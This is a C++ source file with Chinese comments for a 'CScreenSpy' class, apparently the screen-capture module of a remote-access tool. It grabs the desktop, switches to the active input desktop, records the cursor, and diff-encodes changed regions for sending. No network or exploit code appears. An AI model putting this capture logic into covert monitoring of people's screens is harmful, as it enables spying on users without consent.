// ScreenSpy.cpp: implementation of the CScreenSpy class.
//
//////////////////////////////////////////////////////////////////////
#include "ScreenSpy.h"

#define RGB2GRAY(r,g,b) (((b)*117 + (g)*601 + (r)*306) >> 10)

#define DEF_STEP	13
#define OFF_SET		16

LONG CScreenSpy::nOldCursorPosX = 0;
LONG CScreenSpy::nOldCursorPosY = 0;

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

#ifdef _CONSOLE
#include <stdio.h>
#endif
CScreenSpy::CScreenSpy(int biBitCount, bool bIsGray, UINT nMaxFrameRate)
{
    switch (biBitCount) {
    case 1:
    case 4:
    case 8:
    case 16:
    case 32:
        m_biBitCount = biBitCount;
        break;
    default:
        m_biBitCount = 8;
    }

    if (!SelectInputWinStation0()) {
        m_hDeskTopWnd = GetDesktopWindow();
        m_hFullDC = GetDC(m_hDeskTopWnd);
    }

    m_dwBitBltRop	= SRCCOPY;

    m_bAlgorithm	= ALGORITHM_SCAN; // 默认使用隔行扫描算法
    m_dwLastCapture	= GetTickCount();
    m_nMaxFrameRate	= nMaxFrameRate;
    m_dwSleep		= 1000 / nMaxFrameRate;
    m_bIsGray		= bIsGray;
    m_nFullWidth	= ::GetSystemMetrics(SM_CXSCREEN);
    m_nFullHeight	= ::GetSystemMetrics(SM_CYSCREEN);
    m_nIncSize		= 32 / m_biBitCount;

    m_nStartLine	= 0;

    m_hFullMemDC	= ::CreateCompatibleDC(m_hFullDC);
    m_hDiffMemDC	= ::CreateCompatibleDC(m_hFullDC);
    m_hLineMemDC	= ::CreateCompatibleDC(NULL);
    m_hRectMemDC	= ::CreateCompatibleDC(NULL);
    m_lpvLineBits	= NULL;
    m_lpvFullBits	= NULL;

    m_lpbmi_line	= ConstructBI(m_biBitCount, m_nFullWidth, 1);
    m_lpbmi_full	= ConstructBI(m_biBitCount, m_nFullWidth, m_nFullHeight);
    m_lpbmi_rect	= ConstructBI(m_biBitCount, m_nFullWidth, 1);

    m_hLineBitmap	= ::CreateDIBSection(m_hFullDC, m_lpbmi_line, DIB_RGB_COLORS, &m_lpvLineBits, NULL, NULL);
    m_hFullBitmap	= ::CreateDIBSection(m_hFullDC, m_lpbmi_full, DIB_RGB_COLORS, &m_lpvFullBits, NULL, NULL);
    m_hDiffBitmap	= ::CreateDIBSection(m_hFullDC, m_lpbmi_full, DIB_RGB_COLORS, &m_lpvDiffBits, NULL, NULL);

    ::SelectObject(m_hFullMemDC, m_hFullBitmap);
    ::SelectObject(m_hLineMemDC, m_hLineBitmap);
    ::SelectObject(m_hDiffMemDC, m_hDiffBitmap);

    ::SetRect(&m_changeRect, 0, 0, m_nFullWidth, m_nFullHeight);

    // 足够了
    m_rectBuffer = new BYTE[m_lpbmi_full->bmiHeader.biSizeImage * 2];
    m_nDataSizePerLine = m_lpbmi_full->bmiHeader.biSizeImage / m_nFullHeight;

    m_rectBufferOffset = 0;
}

CScreenSpy::~CScreenSpy()
{
    ::ReleaseDC(m_hDeskTopWnd, m_hFullDC);
    ::DeleteDC(m_hLineMemDC);
    ::DeleteDC(m_hFullMemDC);
    ::DeleteDC(m_hRectMemDC);
    ::DeleteDC(m_hDiffMemDC);

    ::DeleteObject(m_hLineBitmap);
    ::DeleteObject(m_hFullBitmap);
    ::DeleteObject(m_hDiffBitmap);

    if (m_rectBuffer)
        delete[] m_rectBuffer;
    delete[]	m_lpbmi_full;
    delete[]	m_lpbmi_line;
    delete[]	m_lpbmi_rect;
}


bool SwitchInputDesktop0()
{
    BOOL	bRet = false;
    DWORD	dwLengthNeeded;

    HDESK	hOldDesktop, hNewDesktop;
    TCHAR	strCurrentDesktop[256], strInputDesktop[256];

    hOldDesktop = GetThreadDesktop(GetCurrentThreadId());
    memset(strCurrentDesktop, 0, sizeof(strCurrentDesktop));
    GetUserObjectInformation(hOldDesktop, UOI_NAME, &strCurrentDesktop, sizeof(strCurrentDesktop), &dwLengthNeeded);


    hNewDesktop = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
    memset(strInputDesktop, 0, sizeof(strInputDesktop));
    GetUserObjectInformation(hNewDesktop, UOI_NAME, &strInputDesktop, sizeof(strInputDesktop), &dwLengthNeeded);

    if (lstrcmpi(strInputDesktop, strCurrentDesktop) != 0) {
        SetThreadDesktop(hNewDesktop);
        bRet = true;
    }
    CloseDesktop(hOldDesktop);

    CloseDesktop(hNewDesktop);


    return bRet;
}

bool CScreenSpy::SelectInputWinStation0()
{
    bool bRet = ::SwitchInputDesktop0();
    if (bRet) {
        ReleaseDC(m_hDeskTopWnd, m_hFullDC);
        m_hDeskTopWnd = GetDesktopWindow();
        m_hFullDC = GetDC(m_hDeskTopWnd);
    }
    return bRet;
}


LPVOID CScreenSpy::getNextScreen(LPDWORD lpdwBytes)
{
    if (lpdwBytes == NULL || m_rectBuffer == NULL)
        return NULL;

    SelectInputWinStation0();

    // 重置rect缓冲区指针
    m_rectBufferOffset = 0;

    // 写入使用了哪种算法
    WriteRectBuffer((LPBYTE)&m_bAlgorithm, sizeof(m_bAlgorithm));

    // 写入光标位置
    POINT	CursorPos;
    GetCursorPos(&CursorPos);
    WriteRectBuffer((LPBYTE)&CursorPos, sizeof(POINT));

    // 写入当前光标类型
    BYTE	bCursorIndex = m_CursorInfo.getCurrentCursorIndex();
    WriteRectBuffer(&bCursorIndex, sizeof(BYTE));

    // 差异比较算法
    if (m_bAlgorithm == ALGORITHM_DIFF) {
        // 分段扫描全屏幕
        ScanScreen(m_hDiffMemDC, m_hFullDC, m_lpbmi_full->bmiHeader.biWidth, m_lpbmi_full->bmiHeader.biHeight);
        *lpdwBytes = m_rectBufferOffset +
                     Compare((LPBYTE)m_lpvDiffBits, (LPBYTE)m_lpvFullBits, m_rectBuffer + m_rectBufferOffset, m_lpbmi_full->bmiHeader.biSizeImage);
        return m_rectBuffer;
    }

    // 鼠标位置发变化并且热点区域如果发生变化，以(发生变化的行 + DEF_STEP)向下扫描
    // 向上提
    for (int i = m_nStartLine; i < m_nFullHeight; i += DEF_STEP+1)
        ScanChangedRect(i);

    *lpdwBytes = m_rectBufferOffset;
    m_nStartLine = (m_nStartLine + 3) % (DEF_STEP+1);

    if ( nOldCursorPosX != CursorPos.x || nOldCursorPosY != CursorPos.y || *lpdwBytes != 10) {
        nOldCursorPosX = CursorPos.x;
        nOldCursorPosY = CursorPos.y;
    } else {
        *lpdwBytes = 0;
    }

    // 限制发送帧的速度
    while (GetTickCount() - m_dwLastCapture < m_dwSleep)
        Sleep(50);
    InterlockedExchange((LPLONG)&m_dwLastCapture, GetTickCount());

    return m_rectBuffer;
}



bool CScreenSpy::ScanChangedRect(int nStartLine)
{
    bool	bRet = false;
    LPDWORD p1, p2;
    ::BitBlt(m_hLineMemDC, 0, 0, m_nFullWidth, 1, m_hFullDC, 0, nStartLine, m_dwBitBltRop);
    // 0 是最后一行
    p1 = (PDWORD)((DWORD)m_lpvFullBits + ((m_nFullHeight - 1 - nStartLine) * m_nDataSizePerLine));
    p2 = (PDWORD)m_lpvLineBits;
    ::SetRect(&m_changeRect, -1, nStartLine - DEF_STEP, -1, nStartLine + DEF_STEP);

    int nTotal_BitWidth = m_nFullWidth * m_biBitCount;
    int nchBitWidth = (((nTotal_BitWidth & 7) + nTotal_BitWidth) >> 3) >> 2;

    for (int i = 0; i < nchBitWidth; ++i) {
        if ( *(p1+i) != *(p2+i) ) {
            if (m_changeRect.right < 0)
                m_changeRect.left = 32 * i / m_biBitCount - OFF_SET;
            m_changeRect.right =  32 * i / m_biBitCount + OFF_SET;

            if (m_biBitCount > 2)
                i = i + m_biBitCount / 2 - 1;
        }
    }

    if (m_changeRect.right > -1) {
        m_changeRect.left   = max(m_changeRect.left, 0);
        m_changeRect.top    = max(m_changeRect.top, 0);
        m_changeRect.right  = min(m_changeRect.right, m_nFullWidth);
        m_changeRect.bottom = min(m_changeRect.bottom, m_nFullHeight);

        // 复制改变的区域
        CopyRect(&m_changeRect);
        bRet = true;
    }

    return bRet;
}

void CScreenSpy::setAlgorithm(UINT nAlgorithm)
{
    InterlockedExchange((LPLONG)&m_bAlgorithm, nAlgorithm);
}

LPBITMAPINFO CScreenSpy::ConstructBI(int biBitCount, int biWidth, int biHeight)
{
    /*
    biBitCount 为1 (黑白二色图) 、4 (16 色图) 、8 (256 色图) 时由颜色表项数指出颜色表大小
    biBitCount 为16 (16 位色图) 、24 (真彩色图, 不支持) 、32 (32 位色图) 时没有颜色表
    	*/
    int	color_num = biBitCount <= 8 ? 1 << biBitCount : 0;

    int nBISize = sizeof(BITMAPINFOHEADER) + (color_num * sizeof(RGBQUAD));
    BITMAPINFO	*lpbmi = (BITMAPINFO *) new BYTE[nBISize];

    BITMAPINFOHEADER	*lpbmih = &(lpbmi->bmiHeader);
    lpbmih->biSize = sizeof(BITMAPINFOHEADER);
    lpbmih->biWidth = biWidth;
    lpbmih->biHeight = biHeight;
    lpbmih->biPlanes = 1;
    lpbmih->biBitCount = biBitCount;
    lpbmih->biCompression = BI_RGB;
    lpbmih->biXPelsPerMeter = 0;
    lpbmih->biYPelsPerMeter = 0;
    lpbmih->biClrUsed = 0;
    lpbmih->biClrImportant = 0;
    lpbmih->biSizeImage = (((lpbmih->biWidth * lpbmih->biBitCount + 31) & ~31) >> 3) * lpbmih->biHeight;

    // 16位和以后的没有颜色表，直接返回
    if (biBitCount >= 16)
        return lpbmi;
    /*
    Windows 95和Windows 98：如果lpvBits参数为NULL并且GetDIBits成功地填充了BITMAPINFO结构，那么返回值为位图中总共的扫描线数。

    Windows NT：如果lpvBits参数为NULL并且GetDIBits成功地填充了BITMAPINFO结构，那么返回值为非0。如果函数执行失败，那么将返回0值。Windows NT：若想获得更多错误信息，请调用callGetLastError函数。
    */

    HDC	hDC = GetDC(NULL);
    HBITMAP hBmp = CreateCompatibleBitmap(hDC, 1, 1); // 高宽不能为0
    GetDIBits(hDC, hBmp, 0, 0, NULL, lpbmi, DIB_RGB_COLORS);
    ReleaseDC(NULL, hDC);
    DeleteObject(hBmp);

    if (m_bIsGray) {
        for (int i = 0; i < color_num; i++) {
            int color = RGB2GRAY(lpbmi->bmiColors[i].rgbRed, lpbmi->bmiColors[i].rgbGreen, lpbmi->bmiColors[i].rgbBlue);
            lpbmi->bmiColors[i].rgbRed = lpbmi->bmiColors[i].rgbGreen = lpbmi->bmiColors[i].rgbBlue = color;
        }
    }

    return lpbmi;
}

void CScreenSpy::WriteRectBuffer(LPBYTE	lpData, int nCount)
{
    memcpy(m_rectBuffer + m_rectBufferOffset, lpData, nCount);
    m_rectBufferOffset += nCount;
}

LPVOID CScreenSpy::getFirstScreen()
{
    ::BitBlt(m_hFullMemDC, 0, 0, m_nFullWidth, m_nFullHeight, m_hFullDC, 0, 0, m_dwBitBltRop);
    return m_lpvFullBits;
}

void CScreenSpy::CopyRect( LPRECT lpRect )
{
    int	nRectWidth = lpRect->right - lpRect->left;
    int	nRectHeight = lpRect->bottom - lpRect->top;

    LPVOID	lpvRectBits = NULL;
    // 调整m_lpbmi_rect
    m_lpbmi_rect->bmiHeader.biWidth = nRectWidth;
    m_lpbmi_rect->bmiHeader.biHeight = nRectHeight;
    m_lpbmi_rect->bmiHeader.biSizeImage = (((m_lpbmi_rect->bmiHeader.biWidth * m_lpbmi_rect->bmiHeader.biBitCount + 31) & ~31) >> 3)
                                          * m_lpbmi_rect->bmiHeader.biHeight;


    HBITMAP	hRectBitmap = ::CreateDIBSection(m_hFullDC, m_lpbmi_rect, DIB_RGB_COLORS, &lpvRectBits, NULL, NULL);
    ::SelectObject(m_hRectMemDC, hRectBitmap);
    ::BitBlt(m_hFullMemDC, lpRect->left, lpRect->top, nRectWidth, nRectHeight, m_hFullDC, lpRect->left, lpRect->top, m_dwBitBltRop);
    ::BitBlt(m_hRectMemDC, 0, 0, nRectWidth, nRectHeight, m_hFullMemDC, lpRect->left, lpRect->top, SRCCOPY);

    WriteRectBuffer((LPBYTE)lpRect, sizeof(RECT));
    WriteRectBuffer((LPBYTE)lpvRectBits, m_lpbmi_rect->bmiHeader.biSizeImage);

    DeleteObject(hRectBitmap);
}

UINT CScreenSpy::getFirstImageSize()
{
    return m_lpbmi_full->bmiHeader.biSizeImage;
}


void CScreenSpy::setCaptureLayer(bool bIsCaptureLayer)
{
    DWORD dwRop = SRCCOPY;
    if (bIsCaptureLayer)
        dwRop |= CAPTUREBLT;
    InterlockedExchange((LPLONG)&m_dwBitBltRop, dwRop);
}

LPBITMAPINFO CScreenSpy::getBI()
{
    return m_lpbmi_full;
}

UINT CScreenSpy::getBISize()
{
    int	color_num = m_biBitCount <= 8 ? 1 << m_biBitCount : 0;

    return sizeof(BITMAPINFOHEADER) + (color_num * sizeof(RGBQUAD));
}


void CScreenSpy::ScanScreen( HDC hdcDest, HDC hdcSrc, int nWidth, int nHeight)
{
    int	nJumpLine = 50;
    int	nJumpSleep = nJumpLine / 10; // 扫描间隔
    // 扫描屏幕
    for (int i = 0, nToJump = 0; i < nHeight; i += nToJump) {
        int	nOther = nHeight - i;

        if (nOther > nJumpLine)
            nToJump = nJumpLine;
        else
            nToJump = nOther;
        BitBlt(hdcDest, 0, i, nWidth, nToJump, hdcSrc,	0, i, m_dwBitBltRop);
        Sleep(nJumpSleep);
    }
}

// 差异比较算法块的函数
int CScreenSpy::Compare( LPBYTE lpSource, LPBYTE lpDest, LPBYTE lpBuffer, DWORD dwSize )
{
    // Windows规定一个扫描行所占的字节数必须是4的倍数, 所以用DWORD比较
// 	LPDWORD	p1, p2;
// 	p1 = (LPDWORD)lpDest;
// 	p2 = (LPDWORD)lpSource;
//
// 	// 偏移的偏移，不同长度的偏移
// 	int	nOffsetOffset = 0, nBytesOffset = 0, nDataOffset = 0;
// 	int nCount = 0; // 数据计数器
// 	// p1++实际上是递增了一个DWORD
// 	for (DWORD i = 0; i < dwSize; i += 4, p1++, p2++)
// 	{
// 		if (*p1 == *p2)
// 			continue;
// 		// 一个新数据块开始
// 		// 写入偏移地址
// 		*(LPDWORD)(lpBuffer + nOffsetOffset) = i;
// 		// 记录数据大小的存放位置
// 		nBytesOffset = nOffsetOffset + sizeof(int);
// 		nDataOffset = nBytesOffset + sizeof(int);
// 		nCount = 0; // 数据计数器归零
//
// 		// 更新Dest中的数据
// 		*p1 = *p2;
// 		*(LPDWORD)(lpBuffer + nDataOffset + nCount) = *p2;
//
// 		nCount += 4;
// 		i += 4, p1++, p2++;
//
// 		for (DWORD j = i; j < dwSize; j += 4, i += 4, p1++, p2++)
// 		{
// 			if (*p1 == *p2)
// 				break;
//
// 			// 更新Dest中的数据
// 			*p1 = *p2;
// 			*(LPDWORD)(lpBuffer + nDataOffset + nCount) = *p2;
// 			nCount += 4;
// 		}
// 		// 写入数据长度
// 		*(LPDWORD)(lpBuffer + nBytesOffset) = nCount;
// 		nOffsetOffset = nDataOffset + nCount;
// 	}
//
// 	// nOffsetOffset 就是写入的总大小
// 	return nOffsetOffset;

    //感觉汇编速度还没有C算法快，郁闷来着
    int	Bytes = 0;
    __asm {
        mov     esi, [lpSource]
        mov     edi, [lpDest]
        mov     ebx, [lpBuffer]
        xor		ecx, ecx
        jmp		short Loop_Compare				// 开始进行比较
        Loop_Compare_Continue:
        mov     eax, dword ptr [esi]
        cmp     eax, dword ptr [edi]
        je      short Loop_Compare_Equal		// 如果相等, 继续比较
        mov		[edi], eax						// 写入不同的数据到目标中
        mov     edx, ebx						// edx 记录第一个不同区域块的起始位置
        mov     dword ptr [ebx], ecx
        add     ebx, 8
        mov     dword ptr [ebx], eax
        add     ebx, 4
        add     esi, 4
        add     edi, 4
        add     ecx, 4
        jmp     short Loop_Block_Compare		// 数据不同，产生一个区块，对这个区块进行比较
        Loop_Block_Compare_Continue:
        mov     eax, dword ptr [esi]
        cmp     eax, dword ptr [edi]
        jnz     short Loop_Block_Compare_Not_Equal // 数据不相等，写入
        mov     eax, ecx
        sub     eax, dword ptr [edx]
        add     edx, 4
        mov     dword ptr [edx], eax
        add     eax, 8
        add     [Bytes], eax
        add     esi, 4
        add     edi, 4
        add     ecx, 4
        jmp     short Loop_Block_Compare_Finish
        Loop_Block_Compare_Not_Equal:
        mov     dword ptr [ebx], eax
        mov		[edi], eax					// 写入不同的数据到目标中
        add     ebx, 4
        add     esi, 4
        add     edi, 4
        add     ecx, 4
        Loop_Block_Compare:
        cmp     ecx, [dwSize]
        jb      short Loop_Block_Compare_Continue
        Loop_Block_Compare_Finish:
        cmp     ecx, [dwSize]
        jnz     short Loop_Compare
        mov     eax, ecx
        sub     eax, dword ptr [edx]
        add     edx, 4
        mov     dword ptr [edx], eax
        add     eax, 8
        add     [Bytes], eax
        jmp     short Loop_Compare
        Loop_Compare_Equal:
        add     esi, 4
        add     edi, 4
        add     ecx, 4
        Loop_Compare:
        cmp     ecx, [dwSize]
        jb      short Loop_Compare_Continue
    }
    return Bytes;
}
